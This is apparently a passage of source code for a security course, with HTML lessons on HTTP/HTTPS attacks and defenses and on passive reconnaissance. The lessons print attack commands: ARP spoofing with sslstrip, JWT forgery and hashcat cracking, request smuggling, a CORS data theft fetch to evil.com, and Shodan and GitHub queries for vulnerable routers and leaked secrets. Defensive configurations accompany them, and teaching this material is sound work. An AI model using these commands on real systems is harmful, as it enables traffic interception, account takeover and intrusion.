X-Forwarded-For: 192.168.1.100
Cookie: session=abc123def456; csrf_token=xyz789
Origin: https://acme.com
Referer: https://acme.com/login
Connection: keep-alive

{"username":"alice","password":"hunter2"}</code></pre>

<p>Every component has security implications:</p>
<ul>
  <li><strong>Host header</strong>: Required in HTTP/1.1. Determines which virtual host
  handles the request. Host header injection can redirect password reset emails to attacker-controlled
  domains if the application uses it to build URLs.</li>
  <li><strong>User-Agent</strong>: Browser and OS identification. Trivially spoofed — do not
  trust it for security decisions. Useful for logging and detecting automated scanners.</li>
  <li><strong>Authorization</strong>: Contains credentials — Basic (base64 username:password),
  Bearer tokens (JWTs), or API keys. Must only be sent over HTTPS.</li>
  <li><strong>X-Forwarded-For</strong>: Added by load balancers to carry the original client IP
  through the proxy chain. Trivially spoofable — an attacker can add this header themselves to
  bypass IP-based rate limiting or geoblocking.</li>
  <li><strong>Referer</strong>: Previous page URL. Can leak sensitive URL parameters (password
  reset tokens, session IDs in URLs) to external sites if a page links out.</li>
</ul>

<h3>HTTP Methods — Safety and Idempotency</h3>
<pre><code>Method    Safe?  Idempotent?  Body?   Purpose
GET       Yes    Yes          No      Retrieve resource (must not modify state)
HEAD      Yes    Yes          No      GET but return only headers (check existence)
OPTIONS   Yes    Yes          No      Discover allowed methods on endpoint
POST      No     No           Yes     Create resource, submit data, trigger action
PUT       No     Yes          Yes     Replace resource entirely (idempotent: same result if repeated)
PATCH     No     No           Yes     Partially update resource
DELETE    No     Yes          No      Delete resource (idempotent: deleting non-existent is OK)
TRACE     Yes    Yes          No      Echo request back (debug — DISABLE this in production)
CONNECT   No     No           No      Establish tunnel (used for HTTPS through HTTP proxy)</code></pre>

<p><strong>Safe</strong> means the method must not modify server state — GET should never
delete records or trigger purchases. <strong>Idempotent</strong> means calling it N times
produces the same result as calling it once — crucial for retry logic.</p>

<h3>HTTP Status Codes — The Security-Relevant Ones</h3>
<pre><code>200 OK          → Request succeeded
201 Created     → Resource created (include Location header pointing to it)
204 No Content  → Success, no body (common for DELETE)

301 Moved Permanently → Cache this redirect forever; update bookmarks
302 Found (Temp)      → Temporary redirect; do not cache; use original URL next time
304 Not Modified      → Conditional GET; use cached copy

400 Bad Request    → Malformed syntax; the client sent garbage
401 Unauthorized   → Authentication required (name is misleading — it means unauthenticated)
403 Forbidden      → Authenticated but not authorized (do not reveal whether resource exists)
404 Not Found      → Resource does not exist (security: use 403 for hidden resources, not 404)
405 Method Not Allowed → Method not supported on this endpoint
429 Too Many Requests  → Rate limiting; include Retry-After header

500 Internal Server Error → Generic unhandled exception (attacker information)
502 Bad Gateway          → Proxy cannot reach backend (reveals two-tier architecture)
503 Service Unavailable  → Server overloaded or in maintenance
504 Gateway Timeout      → Backend responded too slowly</code></pre>

<blockquote>
  The 401 vs 403 distinction matters for security: 401 should only appear when
  authentication is required. 403 when authentication succeeded but authorization failed.
  Returning 404 for unauthorized resources is an information-hiding technique — it prevents
  attackers from confirming that a resource exists even if they cannot access it.
</blockquote>

<h3>TLS/HTTPS — The Full Technical Picture</h3>
<p>
  HTTPS is HTTP transported inside a TLS (Transport Layer Security) session. TLS provides
  three security properties: <strong>confidentiality</strong> (encrypted, eavesdroppers
  cannot read), <strong>integrity</strong> (MAC prevents tampering), and
  <strong>authentication</strong> (the server proves its identity via a certificate).
</p>
<p>
  The <strong>TLS 1.3 handshake</strong> (RFC 8446, 2018) completes in <strong>one round trip</strong>:
</p>
<pre><code>Client                                           Server
  |                                               |
  |-- ClientHello -------------------------------->|
  |   TLS version: 1.3                            |
  |   Supported cipher suites: TLS_AES_256_GCM... |
  |   Key share: client's ECDH public key         |
  |   SNI: acme.com (which virtual host)          |
  |                                               |
  |<-- ServerHello --------------------------------|
  |    Selected cipher: TLS_AES_256_GCM_SHA384    |
  |    Key share: server's ECDH public key        |
  |    Certificate: [signed cert chain]           |
  |    CertificateVerify: signature over handshake|
  |    Finished: HMAC over entire handshake       |
  |                                               |
  |-- Finished ----------------------------------->|
  |   (Client verifies server cert and Finished)  |
  |                                               |
  |<== Encrypted HTTP traffic ===================>|

Both sides derive the same symmetric key from the ECDH exchange.
No key material is transmitted — only public values used to compute shared secret.
Perfect Forward Secrecy: compromising the server's private key later does NOT
decrypt past sessions (ephemeral ECDH key discarded after each session).</code></pre>

<h3>Certificate Validation Chain</h3>
<p>
  When your browser receives a server certificate, it validates a chain: the server's
  <strong>leaf certificate</strong> is signed by an <strong>intermediate CA</strong>, which
  is signed by a <strong>root CA</strong> in your trust store. Operating systems and browsers
  ship with ~150 root CAs pre-trusted. Any of those CAs can issue a certificate for any domain —
  this is why Certificate Transparency logs exist (to catch misissuance).
</p>

<h3>Cookies — The Complete Security Picture</h3>
<pre><code>Set-Cookie: session=abc123def456;
    Secure;          # Only sent over HTTPS connections
    HttpOnly;        # JavaScript cannot access via document.cookie
    SameSite=Strict; # Never sent in cross-site requests (CSRF prevention)
    Path=/;          # Valid for all paths on this domain
    Domain=acme.com; # Valid for acme.com and subdomains (omit for host-only)
    Max-Age=3600;    # Expire after 1 hour
    __Host- prefix:  # Strongest: must be Secure, Path=/, no Domain, same host only</code></pre>

<p>
  <strong>SameSite</strong> values deserve careful understanding:
</p>
<ul>
  <li><strong>Strict</strong>: Cookie is never sent on cross-site requests, including when
  clicking a link from another site. Maximum CSRF protection but breaks OAuth flows that depend
  on cross-site redirects with session state.</li>
  <li><strong>Lax</strong>: Cookie sent on cross-site navigation via GET (clicking links) but
  not on POST requests from other sites. The browser default since Chrome 80. Protects against
  most CSRF while allowing top-level navigation.</li>
  <li><strong>None</strong>: Cookie sent on all requests regardless of origin. Must be paired
  with Secure flag. Required for third-party cookies (ad networks, embedded widgets) — being
  deprecated in most browsers.</li>
</ul>

<h3>JWT — Structure, Use, and Vulnerabilities</h3>
<p>
  JSON Web Tokens (JWT, RFC 7519) are the dominant mechanism for stateless authentication in
  modern APIs. A JWT consists of three base64url-encoded JSON objects separated by dots:
</p>
<pre><code># Structure: header.payload.signature
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwibmFtZSI6IkFsaWNlIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDkxMjM0NTZ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Decoded header:
{ "alg": "RS256", "typ": "JWT" }

# Decoded payload (claims):
{
  "sub": "1234",           # Subject (user ID)
  "name": "Alice",
  "role": "user",          # Authorization claim
  "exp": 1709123456,       # Expiry (Unix timestamp)
  "iat": 1709119856        # Issued at
}

# Signature: RS256(base64(header) + "." + base64(payload), privateKey)</code></pre>
\`,
    technique: \`
<h2>How Attackers Exploit HTTP and HTTPS</h2>

<h3>Server Fingerprinting via HTTP Headers</h3>
<p>
  Before exploiting a web application, attackers identify the exact software stack.
  HTTP response headers routinely disclose precise version numbers — enough to directly
  query CVE databases:
</p>
<pre><code>curl -I https://target.com

HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)        ← CVE-2021-41773 path traversal / RCE!
X-Powered-By: PHP/7.4.21            ← Check php.net/ChangeLog for 7.4 CVEs
X-Generator: Drupal 8 (https://...)  ← Drupalgeddon2 CVE-2018-7600?
X-Runtime: Ruby                      ← Rails app — check for CVE-2019-5420
Via: 1.1 varnish                    ← Varnish cache in front

# After fingerprinting:
searchsploit apache 2.4.49
# Exploit DB shows: CVE-2021-41773 — Path Traversal and RCE in Apache 2.4.49
# Apache forgot to fix it fully; 2.4.50 was also vulnerable (CVE-2021-42013)

# Timing-based fingerprinting:
# nginx returns 400 Bad Request in ~1ms
# Apache returns in ~5ms
# These differences persist even after removing Server header</code></pre>

<h3>SSL/TLS Stripping</h3>
<p>
  An attacker with a man-in-the-middle position (ARP spoofing on local network, rogue WiFi AP,
  compromised router) can downgrade HTTPS connections to HTTP using a tool like
  <strong>sslstrip</strong>. The victim's browser never initiates TLS — the attacker
  transparently proxies their plaintext traffic while maintaining HTTPS with the real server.
</p>
<pre><code># Attack setup (requires MITM position):
# 1. ARP spoof to become the gateway
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1   # tell victim: "I am the router"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50   # tell router: "I am the victim"

# 2. Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

# 3. Run sslstrip to intercept and downgrade:
sslstrip -l 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# What the victim sees: http://bank.com (no padlock, no warning in older browsers)
# What the attacker captures: plaintext username, password, session cookies

# Why HSTS defeats this:
# If bank.com sends: Strict-Transport-Security: max-age=31536000
# Browser caches this policy and REFUSES to connect over HTTP for 1 year
# sslstrip cannot intercept the initial request because browser forces HTTPS

# Why HSTS preloading is even stronger:
# Browser ships with hardcoded list of domains that are ALWAYS HTTPS
# Even the very first visit (before ever receiving an HSTS header) is HTTPS-forced
# Submit at: hstspreload.org</code></pre>

<h3>JWT Attacks</h3>
<p>
  JWTs have a notorious history of implementation vulnerabilities. The most famous:
</p>
<pre><code># Attack 1: Algorithm None (CVE-2015-9235 class)
# JWT spec allows alg: "none" — no signature required
# Vulnerable libraries accept unsigned tokens if alg is changed to none:

# Original token (RS256 signed):
eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIG...

# Forged token (no signature, alg:none):
eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
# Last segment is empty (no signature)
# Vulnerable library accepts this as valid and promotes attacker to admin

# Attack 2: RS256 → HS256 Algorithm Confusion
# RS256 uses asymmetric keys: private key signs, public key verifies
# HS256 uses symmetric key: same secret signs AND verifies
# Attack: change alg to HS256, sign with the SERVER'S PUBLIC KEY (obtainable from /jwks.json)
# Vulnerable library uses public key as HMAC secret → signature verifies!

# Attack 3: Weak Secret Brute Force
# If HS256 is used with a weak secret:
hashcat -a 0 -m 16500 token.jwt wordlist.txt
# Common weak secrets: "secret", "password", "jwt_secret", app name, "changeme"

# Attack 4: Payload Tampering (exp manipulation)
# Decode payload, change exp to year 2099, re-sign (if secret known):
import jwt, datetime
token = jwt.encode(
    {"sub":"1234","role":"admin","exp": datetime.datetime(2099,1,1)},
    "weak_secret",
    algorithm="HS256"
)</code></pre>

<h3>HTTP Request Smuggling</h3>
<p>
  Modern web infrastructure places a reverse proxy (nginx, HAProxy, Cloudflare) in front
  of backend application servers. Request smuggling exploits ambiguity in how these two
  components parse HTTP request boundaries — specifically, disagreement about which takes
  precedence: Content-Length or Transfer-Encoding.
</p>
<pre><code># CL.TE Attack: Frontend uses Content-Length, Backend uses Transfer-Encoding
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13     ← Frontend reads exactly 13 bytes
Transfer-Encoding: chunked   ← Backend switches to chunked mode

0            ← chunked terminator (backend stops here: 1 byte "0" + CRLF)
SMUGGLED     ← these bytes remain in backend's buffer, prepended to NEXT request!

# Effect: the "SMUGGLED" prefix gets prepended to the next legitimate user's request
# This can:
# - Poison the request cache to serve attacker's response to victim
# - Steal victim's request (including session cookies) by routing it into attacker's response
# - Bypass front-end security controls (WAF, IP allowlists on paths)

# CVE-2019-18277: HAProxy request smuggling
# TE.CL variant: Frontend uses Transfer-Encoding, Backend uses Content-Length
# Real-world impact: bypassing Cloudflare WAF to hit internal endpoints

# Detection: Burp Suite Professional has a request smuggling scanner
# Manual test: send ambiguous requests and watch for 404s from hidden paths</code></pre>

<h3>CORS Misconfiguration</h3>
<p>
  Cross-Origin Resource Sharing (CORS) headers control which origins can read API responses
  from JavaScript. When misconfigured, attackers can steal authenticated data from victims'
  browsers by hosting a malicious page that makes credentialed cross-origin requests.
</p>
<pre><code># Vulnerable server reflects arbitrary Origin header:
# Attacker's page at evil.com makes:
fetch('https://api.bank.com/v1/account/balance', {credentials: 'include'})

# Attacker's page sends Origin: https://evil.com
# Vulnerable server responds:
Access-Control-Allow-Origin: https://evil.com   ← reflected directly from request!
Access-Control-Allow-Credentials: true           ← session cookies included!

# Browser allows the response to be read → attacker reads victim's bank balance

# Null origin trust vulnerability:
# Some apps whitelist "null" origin (from sandboxed iframes or file:// pages):
Access-Control-Allow-Origin: null
# Attack: serve from sandboxed iframe → browser sends Origin: null → allowed</code></pre>
\`,
    defense: \`
<h2>Hardening HTTP and HTTPS — The Complete Playbook</h2>

<h3>Security Response Headers — Full Reference with Explanations</h3>
<pre><code># nginx — complete security header configuration:

# HSTS: Force HTTPS for 1 year, include all subdomains, eligible for preload list
# WARNING: Only add preload after testing — removal from preload list takes months
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# CSP: Content Security Policy — prevent XSS and data injection
# Start with report-only mode to identify violations without breaking the site:
add_header Content-Security-Policy-Report-Only "
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM_NONCE}' https://cdn.jsdelivr.net;
    style-src 'self' 'nonce-{RANDOM_NONCE}';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.acme.com;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    report-uri https://csp.acme.com/report
" always;
# Once violations are resolved, change to Content-Security-Policy (enforcing)

# X-Frame-Options: Deprecated in favor of CSP frame-ancestors but still useful
# for older browsers. "DENY" prevents framing entirely.
add_header X-Frame-Options "DENY" always;

# X-Content-Type-Options: Prevent MIME sniffing attacks
# Without this, IE/old Chrome might execute a .jpg file as JavaScript
add_header X-Content-Type-Options "nosniff" always;

# Referrer-Policy: Control what Referer header is sent on outbound links
# strict-origin-when-cross-origin: send full URL for same-origin, only origin for cross-site
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Permissions-Policy: Disable browser features not needed by your app
add_header Permissions-Policy "
    camera=(),
    microphone=(),
    geolocation=(),
    payment=(),
    usb=(),
    fullscreen=(self)
" always;</code></pre>

<h3>TLS Configuration Hardening</h3>
<pre><code># nginx — TLS hardening:
ssl_protocols TLSv1.2 TLSv1.3;   # Disable TLS 1.0 and 1.1 (deprecated, POODLE/BEAST)
ssl_prefer_server_ciphers on;

# Cipher suite ordering — ECDHE first for Perfect Forward Secrecy:
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
# NEVER include: RC4, DES, 3DES, MD5, NULL, EXPORT, anon cipher suites

# OCSP Stapling — server attaches real-time revocation status to TLS handshake
# Prevents privacy leak of querying CA's OCSP server and speeds up handshake:
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/nginx/ssl/chain.pem;

# DH parameters — if using DHE cipher suites, generate strong params:
ssl_dhparam /etc/nginx/ssl/dhparam4096.pem;   # openssl dhparam -out dhparam4096.pem 4096

# Session tickets — disable for strict forward secrecy (TLS 1.3 handles this natively):
ssl_session_tickets off;

# Check your configuration:
# ssllabs.com/ssltest — comprehensive TLS grading (aim for A+)
# testssl.sh — command-line TLS testing tool</code></pre>

<h3>Removing Version Disclosure Headers</h3>
<pre><code># nginx — hide version number from Server header:
server_tokens off;
# Server header becomes: "nginx" (no version)

# Apache — hide version from Server header and error pages:
ServerTokens Prod         # Server: Apache (no version)
ServerSignature Off       # No Apache version on error pages

# PHP — hide X-Powered-By header:
# php.ini:
expose_php = Off

# Node.js / Express — remove X-Powered-By:
app.disable('x-powered-by');

# ASP.NET — remove version headers (web.config):
# <httpRuntime enableVersionHeader="false" />
# <customHeaders>
#   <remove name="X-Powered-By" />
# </customHeaders>

# Custom error pages — replace stack traces with generic pages:
# nginx:
error_page 404 /errors/404.html;
error_page 500 502 503 504 /errors/50x.html;
# The custom page should contain ZERO technical information</code></pre>

<h3>JWT Security — Implementation Requirements</h3>
<pre><code># 1. Always verify the algorithm field — never accept alg:none:
import jwt
try:
    payload = jwt.decode(
        token,
        secret_key,
        algorithms=["HS256"],  # Whitelist only specific algorithms
        options={"verify_exp": True}
    )
except jwt.exceptions.InvalidAlgorithmError:
    return 401

# 2. For distributed systems — use asymmetric RS256 or ES256:
# Sign with private key (keep secret on auth server)
# Verify with public key (can be shared with all services via /jwks.json endpoint)

# 3. Short expiry + refresh token pattern:
{
    "access_token": "eyJ...",    # Short-lived: 15 minutes
    "refresh_token": "eyJ...",   # Long-lived: 7 days, stored HttpOnly cookie
    "expires_in": 900
}
# Access token: stored in memory (JavaScript variable, NOT localStorage — XSS resistant)
# Refresh token: stored in HttpOnly cookie (XSS cannot steal it)

# 4. Rotate session tokens on privilege escalation:
# When user logs in, or gains elevated access — issue NEW token, invalidate old one
# Prevents session fixation and token theft reuse

# 5. Store JWTs in HttpOnly cookies, not localStorage:
# localStorage is readable by any JavaScript (XSS steals it instantly)
# HttpOnly cookie: JavaScript cannot read it; CSRF risk mitigated by SameSite=Strict</code></pre>

<h3>Cookie Hardening — Complete Implementation</h3>
<pre><code># The __Host- prefix provides maximum security:
# Requires: Secure flag, Path=/, no Domain attribute
# Effect: cookie is only sent to the exact host that set it (not subdomains)
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

# Python (Flask) — secure cookie configuration:
from flask import Flask
app = Flask(__name__)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=3600,  # 1 hour
)

# Node.js (Express) — secure session configuration:
app.use(session({
    name: '__Host-sess',
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 3600000   # 1 hour in milliseconds
    },
    resave: false,
    saveUninitialized: false
}));</code></pre>

<h3>WAF Deployment — ModSecurity with OWASP CRS</h3>
<pre><code># ModSecurity v3 with nginx:
# Install: apt install libmodsecurity3 libmodsecurity-dev

# nginx.conf:
load_module modules/ngx_http_modsecurity_module.so;
http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}

# main.conf — OWASP Core Rule Set:
Include /etc/nginx/modsec/modsecurity.conf
Include /usr/share/modsecurity-crs/crs-setup.conf
Include /usr/share/modsecurity-crs/rules/*.conf

# Start in detection mode (log but do not block) for tuning:
SecRuleEngine DetectionOnly
# After tuning: SecRuleEngine On

# Rate limiting in nginx (before requests hit WAF):
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req zone=api burst=20 nodelay;
# Allow burst of 20, then 10 requests/second; excess = 503</code></pre>
\`,
  },`;

// ─────────────────────────────────────────────────────────────────────────────
// PASSIVE-RECON REPLACEMENT
// ─────────────────────────────────────────────────────────────────────────────
const reconReplacement = `  'passive-recon': {
    concept: \`
<h2>Passive Reconnaissance: Intelligence Without Footprints</h2>

<h3>The Intelligence Advantage</h3>
<p>
  Every successful attack begins not with a port scan or an exploit, but with intelligence.
  The military has codified this across centuries: know your enemy, know the terrain, know
  the defenses before committing forces. In cyber operations, the analogy is exact.
  <strong>Passive reconnaissance</strong> is the practice of gathering detailed intelligence
  about a target organization using entirely public sources — leaving no trace in the
  target's logs, triggering no alerts, and remaining entirely within the bounds of
  publicly accessible information.
</p>
<p>
  The intelligence advantage is asymmetric and profound. A defender must protect every
  system, every employee, every piece of information they have ever published. An attacker
  needs to find only one path. During passive reconnaissance, the attacker assembles the
  defender's full picture from fragments scattered across WHOIS records, job postings,
  GitHub repositories, LinkedIn profiles, TLS certificate logs, and search engine caches —
  building a complete map of the target before the target has any idea they are being studied.
</p>

<blockquote>
  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."
  This principle is operationalized by every sophisticated threat actor. The Lazarus Group,
  Salt Typhoon, and Scattered Spider all invested weeks or months in passive intelligence
  gathering before executing their attacks.
</blockquote>

<h3>OPSEC in Passive Reconnaissance</h3>
<p>
  The defining characteristic of passive recon is that you <strong>never touch the target</strong>.
  You are reading public information — no packets arrive at the target's systems from you.
  This has three critical implications:
</p>
<ul>
  <li><strong>No log entries</strong>: The target's firewalls, IDS, and web servers receive
  nothing from you. There is nothing to alert on, nothing to investigate, no IP address to
  block.</li>
  <li><strong>Legal clarity</strong>: Accessing public information (WHOIS, crt.sh, Shodan,
  LinkedIn) is not a computer intrusion offense in any jurisdiction. The Computer Fraud and
  Abuse Act (CFAA) and equivalent laws in other countries require unauthorized access to a
  computer — reading public databases requires no access to the target's computers at all.</li>
  <li><strong>Patience without cost</strong>: Passive recon can continue for weeks or months
  without triggering any response. APT groups routinely spend 60–90 days in the intelligence
  phase before the first technical action.</li>
</ul>
<p>
  Even in passive recon, sophisticated operators use additional OPSEC layers: VPNs or Tor
  to avoid attributing their search patterns, separate infrastructure for different phases,
  and care about which accounts they use to query LinkedIn (viewing someone's profile
  notifies them).
</p>

<h3>WHOIS — The Registry of the Internet</h3>
<p>
  WHOIS (RFC 954, 1985) is the original public database of domain registration information.
  When an organization registers a domain, the registrar collects contact information
  and publishes it in a publicly queryable database. For decades this meant complete transparency:
  registrant name, email, phone number, address, technical contact, administrative contact,
  registrar name, registration date, expiry date, and nameservers.
</p>
<pre><code>whois acme.com

Domain Name: ACME.COM
Registrar: Namecheap, Inc.
Registrar IANA ID: 1068
Registrar Abuse Contact: abuse@namecheap.com
Domain Status: clientTransferProhibited
Creation Date: 1998-04-03T00:00:00Z      ← Domain age indicates organization maturity
Updated Date: 2024-01-15T12:34:56Z       ← Recent update may indicate infrastructure change
Registry Expiry Date: 2025-04-03T00:00:00Z  ← If near expiry: domain squatting risk
Registrant Name: REDACTED FOR PRIVACY    ← GDPR privacy (EU registrant)
Registrant Email: privacy@namecheap.com  ← Proxy email
Name Server: ns1.acme.com               ← Running own nameservers (more to enumerate)
Name Server: ns2.acme.com</code></pre>

<p>
  <strong>GDPR and CCPA Impact</strong>: Since May 2018 (GDPR), registrants in the EU
  have had personal contact data redacted from WHOIS. This significantly reduced the
  intelligence value for personal contacts. However, the following is <em>never</em> redacted:
</p>
<ul>
  <li>Nameservers (reveals hosting provider, DNS infrastructure)</li>
  <li>Registrar (reveals registrar — some registrars have known weak processes)</li>
  <li>Registration and expiry dates (domain age, renewal patterns)</li>
  <li>Domain status codes (transfer locks, redemption periods)</li>
</ul>

<p>
  <strong>Thin vs Thick WHOIS</strong>: TLD registries operate as either thin (referring
  you to the registrar's WHOIS for full data) or thick (holding all data centrally). .com
  and .net are thin; most ccTLDs are thick. <strong>RDAP</strong> (Registration Data
  Access Protocol, RFC 7480) is the modern JSON-based replacement for the text-based
  WHOIS protocol, offering structured data and authentication for accessing non-public fields.
</p>

<h3>Certificate Transparency — Every Certificate is Public</h3>
<p>
  Since 2013 (Google's initiative) and mandatory for Chrome trust since 2018,
  <strong>every TLS certificate issued by a trusted CA must be submitted to at least two
  public Certificate Transparency logs</strong> before browsers will trust it. These logs
  are append-only, cryptographically verifiable, and <em>permanently public</em>.
</p>
<p>
  This means that every subdomain that has ever received a TLS certificate from a trusted CA
  is permanently recorded in a public log. The intelligence value is enormous:
</p>
<pre><code># Query crt.sh for all certificates ever issued for acme.com:
https://crt.sh/?q=%.acme.com&output=json

# Results reveal:
mail.acme.com         ← Mail server (still active)
vpn.acme.com          ← VPN gateway — issued 3 years ago, still active
api.acme.com          ← API server — when was this first issued?
dev.acme.com          ← Development environment — cert issued 2 years ago
staging.acme.com      ← Staging — cert issued 18 months ago
legacy.acme.com       ← Old system — cert issued 5 years ago (vulnerable?)
jenkins.acme.com      ← CI/CD — should not be internet-facing
*.internal.acme.com   ← Wildcard for internal subdomains — what's behind this?

# Historical analysis:
# A subdomain whose cert was issued years ago but not renewed:
# → system was decommissioned? Or still running without cert renewal?
# CDN changes revealed:
# Old cert: issued to cloudflare.com as SAN
# New cert: issued to fastly.net as SAN
# → Company migrated CDN from Cloudflare to Fastly between these dates</code></pre>

<h3>Shodan — The Search Engine for the Internet of Things</h3>
<p>
  Shodan was created by John Matherly in 2009. Unlike Google, which indexes web content,
  Shodan <strong>port-scans the entire internet</strong> and indexes the service banners —
  the text servers return when you connect to them. It crawls every routable IPv4 address
  on ports 21, 22, 23, 25, 80, 443, 8080, and hundreds of others, collecting and indexing
  every banner. The result is a searchable database of every internet-facing device
  and service on earth.
</p>
<pre><code># Shodan filters — finding specific targets:
org:"Acme Corporation"                    # All Shodan data for Acme Corp's IPs
net:203.0.113.0/24                         # Scan results for entire subnet
hostname:acme.com                          # IPs with reverse DNS pointing to acme.com
ssl.cert.subject.cn:"acme.com"             # TLS certs with acme.com as CN or SAN
product:"Apache httpd" version:"2.4.49"    # Specifically vulnerable Apache version
product:"Cisco IOS XE" port:443           # Cisco routers (Salt Typhoon's initial recon)
http.title:"Outlook Web App"              # Exposed OWA servers
http.title:"Kibana"                       # Exposed Elasticsearch/Kibana (data exposure risk)
http.title:"phpMyAdmin"                   # Database admin panel exposed
"default password" port:23               # Telnet-accessible devices still using defaults
has_screenshot:true port:3389            # RDP servers with screenshots captured by Shodan
country:US port:22 product:"OpenSSH" version:"7.4"  # Vulnerable SSH version in US</code></pre>

<h3>LinkedIn and Social Media Intelligence</h3>
<p>
  LinkedIn is the most valuable passive intelligence source for targeted attacks against
  organizations. The platform is designed to make employees discoverable — and from an
  attacker's perspective, it is a gold mine of organizational structure, technology stack,
  and individual targeting information.
</p>
<ul>
  <li><strong>Organizational mapping</strong>: Search "Acme Corporation" and browse employees
  by job function. Build a complete org chart: who reports to whom, who owns which systems.
  The VP of Infrastructure owns the network. The Director of Cloud Engineering owns AWS.
  Find their names, then find their email format from WHOIS or hunter.io.</li>
  <li><strong>Technology enumeration from job postings</strong>: A job posting for
  "Senior Network Engineer — Cisco CCNP required, experience with IOS XE and SD-WAN
  preferred" tells an attacker the exact network operating system in use. A posting for
  "DevOps Engineer — Kubernetes, AWS EKS, Terraform, GitLab CI/CD" reveals the entire
  cloud and automation stack.</li>
  <li><strong>Individual targeting for spear phishing</strong>: The employee who posted on
  LinkedIn about attending Cisco Live 2024, who has Cisco certifications, and whose title
  is "Network Security Engineer" is the ideal target for a spear phish with a subject line
  about a Cisco IOS XE critical update.</li>
</ul>

<h3>GitHub OSINT — When Source Code Leaks Secrets</h3>
<p>
  GitHub hosts hundreds of millions of repositories, and developers routinely commit
  sensitive material by accident: API keys, AWS credentials, database passwords, private
  keys, internal URLs, and configuration files. Even after deletion, GitHub's search index
  caches content for months. Tools like <strong>truffleHog</strong> and
  <strong>gitleaks</strong> automate scanning for high-entropy strings and known secret patterns.
</p>
<pre><code># GitHub search queries (in the search bar):
org:AcmeCorp "api_key"             # API keys
org:AcmeCorp "aws_access_key"      # AWS credentials
org:AcmeCorp "BEGIN RSA PRIVATE KEY"  # Private keys committed to repo
org:AcmeCorp "password" extension:env  # .env files with passwords
org:AcmeCorp "internal.acme.com"   # Internal URLs revealing architecture
org:AcmeCorp "jdbc:mysql"          # Database connection strings with credentials
org:AcmeCorp filename:.npmrc       # npm tokens (publish credentials)
org:AcmeCorp filename:*.pem        # Certificate/key files

# The Uber 2022 breach:
# Attacker found credentials in a private GitHub repo (via social engineering to access it)
# Credentials led to Privileged Access Management (PAM) system
# Full access to AWS, Google Cloud, Uber's internal Slack, code repositories
# Total cost: hundreds of millions in regulatory fines and remediation

# The 2020 Twitter breach:
# Employee social engineering revealed internal admin tools
# 130 high-profile accounts compromised including Biden, Obama, Musk</code></pre>

<h3>Automated OSINT Tools</h3>
<p>
  Several tools automate the passive recon workflow, combining multiple sources into a
  single interface:
</p>
<ul>
  <li><strong>theHarvester</strong>: Collects emails, hostnames, IPs, and URLs from Google,
  LinkedIn, Shodan, CertSpotter, VirusTotal, and more. Standard first-run tool.</li>
  <li><strong>SpiderFoot</strong>: Comprehensive OSINT automation platform with 200+
  data source modules. Maps relationships between entities (domains, IPs, emails, names)
  into a graph. Community and commercial versions.</li>
  <li><strong>Maltego</strong>: Visual link analysis tool. Drag entities onto a canvas,
  run transforms, and watch the relationship graph grow. Used by law enforcement, threat
  intelligence teams, and penetration testers alike. Particularly powerful for person-of-interest
  investigations combining technical and human intelligence.</li>
</ul>
\`,
    technique: \`
<h2>Passive Recon in Practice — Methodology and Real-World Techniques</h2>

<h3>Salt Typhoon's Pre-Attack OSINT — A Case Study</h3>
<p>
  Salt Typhoon (Chinese APT, also tracked as Earth Estries and FamousSparrow) executed
  one of the most sophisticated telecommunications breaches in history in 2023–2024,
  compromising multiple major US carriers including AT&amp;T, Verizon, Lumen Technologies,
  and T-Mobile. Before any exploit was deployed, the group conducted systematic passive
  reconnaissance against network infrastructure.
</p>
<p>
  The initial targeting vector was <strong>CVE-2023-20198</strong> — a critical privilege
  escalation vulnerability in Cisco IOS XE's web UI (CVSS 10.0). The intelligence-gathering
  phase involved:
</p>
<pre><code># Shodan query identifying vulnerable Cisco IOS XE routers:
product:"Cisco IOS XE" port:443
# Returns tens of thousands of results globally

# Refined to US telecom infrastructure:
product:"Cisco IOS XE" port:443 org:"AT&T" country:US
product:"Cisco IOS XE" port:443 org:"Verizon" country:US
product:"Cisco IOS XE" port:443 org:"Lumen Technologies" country:US

# Shodan banner for a vulnerable device shows:
# HTTP/1.1 200 OK
# Server: cisco-IOS
# X-Powered-By: IOS/17.3.5
# → Version 17.3.5 falls in the vulnerable range for CVE-2023-20198

# Census of vulnerable versions:
# IOS XE 17.3.1 through 17.3.8 — all vulnerable
# IOS XE 17.6.1 through 17.6.6 — all vulnerable
# By comparing Shodan's version data against Cisco's advisory,
# attackers could identify exactly which internet-exposed routers were vulnerable
# before deploying a single packet to a target network</code></pre>

<h3>Complete Passive Recon Workflow — 8-Phase Methodology</h3>

<h4>Phase 1: Domain Registration Intelligence</h4>
